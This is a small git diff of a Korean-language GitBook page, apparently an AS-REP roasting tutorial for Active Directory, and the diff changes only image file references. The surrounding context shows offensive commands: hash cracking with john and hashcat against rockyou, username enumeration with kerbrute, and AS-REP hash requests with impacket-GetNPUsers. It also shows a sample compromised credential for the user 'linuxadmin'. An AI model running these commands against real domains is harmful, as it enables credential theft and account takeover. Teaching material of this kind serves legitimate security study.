@@ -67,7 +67,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt roast.txt
 hashcat -m 18200 -a 0 .\asreproast.txt .\rockyou.txt
 ```
 
-![](<../../.gitbook/assets/image (5) (1) (2).png>)
+![](<../../.gitbook/assets/image (5) (1) (2) (3).png>)
 
 3\. 공격자는 타겟 유저의 이름 (`linuxadmin`) 과 평문 비밀번호 (`Ohnonono123!`) 를 통해 유저 계정을 장악한다.&#x20;
 
@@ -84,7 +84,7 @@ cat kerbrute-output.txt | grep -i 'valid username' | cut -d ' ' -f 8 > valid-use
 impacket-GetNPUsers <domain>/ -request -usersfile valid-usernames.txt  -dc-ip <dc-ip>
 ```
 
-![](<../../.gitbook/assets/image (5) (1).png>)
+![](<../../.gitbook/assets/image (5) (1) (2).png>)
 
 받아온 `KRB-AS-REP` 응답은 위 실습-1 처럼 johntheripper 나 hashcat 을 이용해 브루트포스한다.&#x20;
 
